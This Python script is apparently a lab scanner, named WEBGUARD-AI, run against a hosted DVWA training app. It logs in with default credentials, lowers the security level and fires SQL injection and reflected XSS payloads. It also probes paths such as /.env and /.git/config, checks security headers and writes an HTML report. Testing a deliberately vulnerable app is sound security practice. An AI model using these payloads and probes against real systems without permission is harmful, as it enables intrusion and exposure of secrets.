import requests
import re
import html
from datetime import datetime

BASE_URL = "https://clinic-production-83e1.up.railway.app/login"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"
XSS_URL = f"{BASE_URL}/vulnerabilities/xss_r/"

sqli_payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR 1=1#",
    "1 UNION SELECT null, null#"
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'><script>alert(1)</script>"
]

sql_error_signatures = [
    "sql syntax", "mysql_fetch", "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark"
]

security_headers = {
    "Content-Security-Policy": "Helps prevent XSS and data injection attacks",
    "X-Frame-Options": "Prevents clickjacking attacks",
    "X-Content-Type-Options": "Prevents MIME-sniffing attacks",
    "Strict-Transport-Security": "Enforces HTTPS connections",
    "X-XSS-Protection": "Legacy XSS filter (still checked for older browsers)",
    "Referrer-Policy": "Controls how much referrer info is sent",
    "Permissions-Policy": "Controls which browser features the site can use"
}

sensitive_paths = [
    "/.git/config", "/.env", "/config.php", "/backup.zip", "/admin/",
    "/phpinfo.php", "/robots.txt", "/.htaccess", "/wp-config.php",
    "/config/", "/database.sql", "/test.php"
]

results = {"sqli": [], "xss": [], "headers": [], "paths": []}


def get_token(session, url):
    page = session.get(url)
    token = re.search(r"user_token' value='(.*?)'", page.text)
    return token.group(1) if token else ""


def login(session):
    token_value = get_token(session, LOGIN_URL)
    payload = {"username": "admin", "password": "password", "Login": "Login", "user_token": token_value}
    session.post(LOGIN_URL, data=payload)
    print("[+] Logged in to DVWA")


def set_security_level(session, level="low"):
    token_value = get_token(session, SECURITY_URL)
    payload = {"security": level, "seclev_submit": "Submit", "user_token": token_value}
    session.post(SECURITY_URL, data=payload)
    print(f"[+] Security level set to '{level}'")


def run_sqli_scan(session):
    print("\n[*] Running SQL Injection scan...")
    baseline = session.get(SQLI_URL, params={"id": "1", "Submit": "Submit"})
    baseline_length = len(baseline.text)

    for payload in sqli_payloads:
        response = session.get(SQLI_URL, params={"id": payload, "Submit": "Submit"})
        vulnerable = False

        for sig in sql_error_signatures:
            if sig.lower() in response.text.lower():
                vulnerable = True
                break

        if response.text.count("First name") > 1:
            vulnerable = True
        if abs(len(response.text) - baseline_length) > 100:
            vulnerable = True

        results["sqli"].append({"payload": payload, "vulnerable": vulnerable})


def run_xss_scan(session):
    print("[*] Running XSS scan...")
    for payload in xss_payloads:
        response = session.get(XSS_URL, params={"name": payload})
        vulnerable = payload in response.text
        results["xss"].append({"payload": payload, "vulnerable": vulnerable})


def run_header_scan():
    print("[*] Running security header scan...")
    try:
        response = requests.get(BASE_URL, timeout=10)
        for header, desc in security_headers.items():
            present = header in response.headers
            value = response.headers.get(header, "")
            results["headers"].append({"header": header, "present": present, "desc": desc, "value": value})
    except requests.exceptions.RequestException as e:
        print(f"[!] Header scan error: {e}")


def run_path_scan():
    print("[*] Running directory/file exposure scan...")
    for path in sensitive_paths:
        url = BASE_URL.rstrip("/") + path
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            results["paths"].append({"path": path, "status": response.status_code})
        except requests.exceptions.RequestException as e:
            results["paths"].append({"path": path, "status": "error"})


def risk_level(count, total):
    """Simple rule-based risk scoring"""
    if total == 0:
        return "N/A"
    ratio = count / total
    if ratio >= 0.6:
        return "Critical"
    elif ratio >= 0.3:
        return "High"
    elif ratio > 0:
        return "Medium"
    return "Low"


def generate_report():
    sqli_vuln_count = sum(1 for r in results["sqli"] if r["vulnerable"])
    xss_vuln_count = sum(1 for r in results["xss"] if r["vulnerable"])
    headers_missing = sum(1 for r in results["headers"] if not r["present"])
    paths_exposed = sum(1 for r in results["paths"] if r["status"] == 200)

    sqli_risk = risk_level(sqli_vuln_count, len(results["sqli"]))
    xss_risk = risk_level(xss_vuln_count, len(results["xss"]))
    header_risk = risk_level(headers_missing, len(results["headers"]))
    path_risk = risk_level(paths_exposed, len(results["paths"]))

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def row(label, value, risk_class):
        return f"<tr><td>{label}</td><td>{value}</td><td class='{risk_class}'>{risk_class.upper()}</td></tr>"

    def sqli_rows():
        return "".join(
            f"<tr><td>{r['payload']}</td><td class='{ 'vuln' if r['vulnerable'] else 'safe' }'>"
            f"{'VULNERABLE' if r['vulnerable'] else 'Not detected'}</td></tr>"
            for r in results["sqli"]
        )

    def xss_rows():
        return "".join(
            f"<tr><td>{html.escape(r['payload'])}</td><td class='{ 'vuln' if r['vulnerable'] else 'safe' }'>"
            f"{'VULNERABLE' if r['vulnerable'] else 'Not detected'}</td></tr>"
            for r in results["xss"]
        )

    def header_rows():
        return "".join(
            f"<tr><td>{r['header']}</td><td class='{ 'safe' if r['present'] else 'vuln' }'>"
            f"{'Present' if r['present'] else 'Missing'}</td><td>{r['desc']}</td></tr>"
            for r in results["headers"]
        )

    def path_rows():
        def classify(status):
            if status == 200:
                return "vuln", "Exposed"
            if status in (301, 302):
                return "warn", "Redirect"
            if status == 403:
                return "warn", "Forbidden"
            return "safe", "Not Found"
        rows = ""
        for r in results["paths"]:
            css, label = classify(r["status"])
            rows += f"<tr><td>{r['path']}</td><td class='{css}'>{label} ({r['status']})</td></tr>"
        return rows

    report_html = f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WEBGUARD-AI Security Report</title>
<style>
    body {{ font-family: Arial, sans-serif; background:#0f172a; color:#e2e8f0; padding:30px; }}
    h1 {{ color:#38bdf8; }}
    h2 {{ color:#facc15; border-bottom:1px solid #334155; padding-bottom:5px; margin-top:40px; }}
    table {{ width:100%; border-collapse:collapse; margin-top:10px; }}
    th, td {{ border:1px solid #334155; padding:8px 12px; text-align:left; }}
    th {{ background:#1e293b; }}
    .vuln {{ color:#f87171; font-weight:bold; }}
    .safe {{ color:#4ade80; }}
    .warn {{ color:#fbbf24; }}
    .Critical {{ color:#f87171; font-weight:bold; }}
    .High {{ color:#fb923c; font-weight:bold; }}
    .Medium {{ color:#facc15; }}
    .Low {{ color:#4ade80; }}
    .summary {{ display:flex; gap:20px; flex-wrap:wrap; margin-top:20px; }}
    .card {{ background:#1e293b; border-radius:8px; padding:15px 20px; min-width:180px; }}
</style>
</head>
<body>
    <h1>WEBGUARD-AI Security Assessment Report</h1>
    <p>Target: {BASE_URL} &nbsp;|&nbsp; Generated: {timestamp}</p>

    <h2>Risk Summary</h2>
    <table>
        <tr><th>Category</th><th>Findings</th><th>Risk Level</th></tr>
        {row("SQL Injection", f"{sqli_vuln_count}/{len(results['sqli'])} payloads succeeded", sqli_risk)}
        {row("Cross-Site Scripting (XSS)", f"{xss_vuln_count}/{len(results['xss'])} payloads succeeded", xss_risk)}
        {row("Missing Security Headers", f"{headers_missing}/{len(results['headers'])} missing", header_risk)}
        {row("Exposed Files/Directories", f"{paths_exposed}/{len(results['paths'])} exposed", path_risk)}
    </table>

    <h2>SQL Injection Details</h2>
    <table><tr><th>Payload</th><th>Result</th></tr>{sqli_rows()}</table>

    <h2>XSS Details</h2>
    <table><tr><th>Payload</th><th>Result</th></tr>{xss_rows()}</table>

    <h2>Security Headers</h2>
    <table><tr><th>Header</th><th>Status</th><th>Purpose</th></tr>{header_rows()}</table>

    <h2>Exposed Files/Directories</h2>
    <table><tr><th>Path</th><th>Status</th></tr>{path_rows()}</table>

</body>
</html>
    """

    with open("webguard_report.html", "w", encoding="utf-8") as f:
        f.write(report_html)

    print("\n[+] Report generated: webguard_report.html")


if __name__ == "__main__":
    session = requests.Session()
    login(session)
    set_security_level(session, "low")

    run_sqli_scan(session)
    run_xss_scan(session)
    run_header_scan()
    run_path_scan()

    generate_report()
    print("\n[+] All scans complete!")